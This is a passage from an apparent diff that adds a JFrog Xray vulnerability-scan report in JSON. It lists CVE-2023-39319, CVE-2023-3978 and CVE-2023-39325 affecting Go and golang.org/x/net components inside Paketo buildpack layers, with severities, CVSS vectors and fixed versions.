+         "edited": "0001-01-01T00:00:00Z",
+         "is_source_root": false,
+         "is_high_profile": false,
+         "component_physical_paths": [
+            "sha256__6b2f3c473f38b33b59e7b51e8ffd3e3e3a32137c664b8490b5699c243dd76ea4.tar.gz/cnb/lifecycle/launcher/github.com/golang/go"
+         ]
+      },
+      {
+         "id": "XRAY-531549",
+         "severity": "Medium",
+         "severity_source": "NVD",
+         "pkg_type": "go",
+         "summary": "The html/template package does not apply the proper rules for handling occurrences of \"<script\", \"<!--\", and \"</script\" within JS literals in <script> contexts. This may cause the template parser to improperly consider script contexts to be terminated early, causing actions to be improperly escaped. This could be leveraged to perform an XSS attack.",
+         "issue_type": "security",
+         "provider": "JFrog",
+         "component": "github.com/golang/go",
+         "source_id": "go://github.com/golang/go",
+         "source_comp_id": "go://github.com/golang/go:1.19.11",
+         "component_versions": {
+            "id": "github.com/golang/go",
+            "vulnerable_versions": [
+               "< 1.20.8",
+               "1.21.0-0 ≤ Version < 1.21.1"
+            ],
+            "fixed_versions": [
+               "1.20.8",
+               "1.21.1"
+            ],
+            "more_details": {
+               "cves": [
+                  {
+                     "cve": "CVE-2023-39319",
+                     "cwe": [
+                        "CWE-79"
+                     ],
+                     "cvss_v3": "6.1/CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+                  }
+               ],
+               "description": "The html/template package does not apply the proper rules for handling occurrences of \"<script\", \"<!--\", and \"</script\" within JS literals in <script> contexts. This may cause the template parser to improperly consider script contexts to be terminated early, causing actions to be improperly escaped. This could be leveraged to perform an XSS attack.",
+               "provider": "JFrog"
+            }
+         },
+         "edited": "0001-01-01T00:00:00Z",
+         "is_source_root": false,
+         "is_high_profile": false,
+         "component_physical_paths": [
+            "sha256__6b2f3c473f38b33b59e7b51e8ffd3e3e3a32137c664b8490b5699c243dd76ea4.tar.gz/cnb/lifecycle/launcher/github.com/golang/go"
+         ]
+      },
+      {
+         "id": "XRAY-531549",
+         "severity": "Medium",
+         "severity_source": "NVD",
+         "pkg_type": "go",
+         "summary": "The html/template package does not apply the proper rules for handling occurrences of \"<script\", \"<!--\", and \"</script\" within JS literals in <script> contexts. This may cause the template parser to improperly consider script contexts to be terminated early, causing actions to be improperly escaped. This could be leveraged to perform an XSS attack.",
+         "issue_type": "security",
+         "provider": "JFrog",
+         "component": "github.com/golang/go",
+         "source_id": "go://github.com/golang/go",
+         "source_comp_id": "go://github.com/golang/go:1.20.5",
+         "component_versions": {
+            "id": "github.com/golang/go",
+            "vulnerable_versions": [
+               "< 1.20.8",
+               "1.21.0-0 ≤ Version < 1.21.1"
+            ],
+            "fixed_versions": [
+               "1.20.8",
+               "1.21.1"
+            ],
+            "more_details": {
+               "cves": [
+                  {
+                     "cve": "CVE-2023-39319",
+                     "cwe": [
+                        "CWE-79"
+                     ],
+                     "cvss_v3": "6.1/CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+                  }
+               ],
+               "description": "The html/template package does not apply the proper rules for handling occurrences of \"<script\", \"<!--\", and \"</script\" within JS literals in <script> contexts. This may cause the template parser to improperly consider script contexts to be terminated early, causing actions to be improperly escaped. This could be leveraged to perform an XSS attack.",
+               "provider": "JFrog"
+            }
+         },
+         "edited": "0001-01-01T00:00:00Z",
+         "is_source_root": false,
+         "is_high_profile": false,
+         "component_physical_paths": [
+            "sha256__3f5f857a24121a63acf8e6415c9cec7790df50647a8bcb4e0f1278ece3826345.tar.gz/layers/paketo-buildpacks_spring-boot/helper/helper/github.com/golang/go",
+            "sha256__61e0cfcb6f3543ca620b2da9d5e475cb85dd48e92d82e119919ea667f4371a6c.tar.gz/layers/paketo-buildpacks_ca-certificates/helper/helper/github.com/golang/go",
+            "sha256__133f79a6622aaa0495c72cc6a3b2e8bd35f7e5222ec86d7fea75f1563ee54a68.tar.gz/layers/paketo-buildpacks_bellsoft-liberica/helper/helper/github.com/golang/go"
+         ]
+      },
+      {
+         "id": "XRAY-527265",
+         "severity": "Medium",
+         "severity_source": "NVD",
+         "pkg_type": "go",
+         "summary": "Text nodes not in the HTML namespace are incorrectly literally rendered, causing text which should be escaped to not be. This could lead to an XSS attack.",
+         "issue_type": "security",
+         "provider": "JFrog",
+         "component": "golang.org/x/net",
+         "source_id": "go://golang.org/x/net",
+         "source_comp_id": "go://golang.org/x/net:0.11.0",
+         "component_versions": {
+            "id": "golang.org/x/net",
+            "vulnerable_versions": [
+               "< 0.13.0"
+            ],
+            "fixed_versions": [
+               "0.13.0"
+            ],
+            "more_details": {
+               "cves": [
+                  {
+                     "cve": "CVE-2023-3978",
+                     "cwe": [
+                        "CWE-79"
+                     ],
+                     "cvss_v3": "6.1/CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+                  }
+               ],
+               "description": "Text nodes not in the HTML namespace are incorrectly literally rendered, causing text which should be escaped to not be. This could lead to an XSS attack.",
+               "provider": "JFrog"
+            }
+         },
+         "edited": "0001-01-01T00:00:00Z",
+         "is_source_root": false,
+         "is_high_profile": false,
+         "component_physical_paths": [
+            "sha256__133f79a6622aaa0495c72cc6a3b2e8bd35f7e5222ec86d7fea75f1563ee54a68.tar.gz/layers/paketo-buildpacks_bellsoft-liberica/helper/helper/golang.org/x/net"
+         ]
+      },
+      {
+         "id": "XRAY-533342",
+         "severity": "Unknown",
+         "severity_source": "NVD",
+         "pkg_type": "go",
+         "summary": "A malicious HTTP/2 client which rapidly creates requests and immediately resets them can cause excessive server resource consumption. While the total number of requests is bounded by the http2.Server.MaxConcurrentStreams setting, resetting an in-progress request allows the attacker to create a new request while the existing one is still executing. With the fix applied, HTTP/2 servers now bound the number of simultaneously executing handler goroutines to the stream concurrency limit (MaxConcurrentStreams). New requests arriving when at the limit (which can only happen after the client has reset an existing, in-flight request) will be queued until a handler exits. If the request queue grows too large, the server will terminate the connection. This issue is also fixed in golang.org/x/net/http2 for users manually configuring HTTP/2. The default stream concurrency limit is 250 streams (requests) per HTTP/2 connection. This value may be adjusted using the golang.org/x/net/http2 package; see the Server.MaxConcurrentStreams setting and the ConfigureServer function.",
+         "issue_type": "security",
+         "provider": "JFrog",
+         "component": "golang.org/x/net",
+         "source_id": "go://golang.org/x/net",
+         "source_comp_id": "go://golang.org/x/net:0.11.0",
+         "component_versions": {
+            "id": "golang.org/x/net",
+            "vulnerable_versions": [
+               "< 0.17.0"
+            ],
+            "fixed_versions": [
+               "0.17.0"
+            ],
+            "more_details": {
+               "cves": [
+                  {
+                     "cve": "CVE-2023-39325",
+                     "cwe": [
+                        "CWE-400"
+                     ]
+                  }
+               ],
+               "description": "A malicious HTTP/2 client which rapidly creates requests and immediately resets them can cause excessive server resource consumption. While the total number of requests is bounded by the http2.Server.MaxConcurrentStreams setting, resetting an in-progress request allows the attacker to create a new request while the existing one is still executing. With the fix applied, HTTP/2 servers now bound the number of simultaneously executing handler goroutines to the stream concurrency limit (MaxConcurrentStreams). New requests arriving when at the limit (which can only happen after the client has reset an existing, in-flight request) will be queued until a handler exits. If the request queue grows too large, the server will terminate the connection. This issue is also fixed in golang.org/x/net/http2 for users manually configuring HTTP/2. The default stream concurrency limit is 250 streams (requests) per HTTP/2 connection. This value may be adjusted using the golang.org/x/net/http2 package; see the Server.MaxConcurrentStreams setting and the ConfigureServer function.",
+               "provider": "JFrog"
+            }
+         },
+         "edited": "0001-01-01T00:00:00Z",
+         "is_source_root": false,
+         "is_high_profile": false,
+         "component_physical_paths": [
+            "sha256__133f79a6622aaa0495c72cc6a3b2e8bd35f7e5222ec86d7fea75f1563ee54a68.tar.gz/layers/paketo-buildpacks_bellsoft-liberica/helper/helper/golang.org/x/net"
+         ]
+      }
+   ]
+}
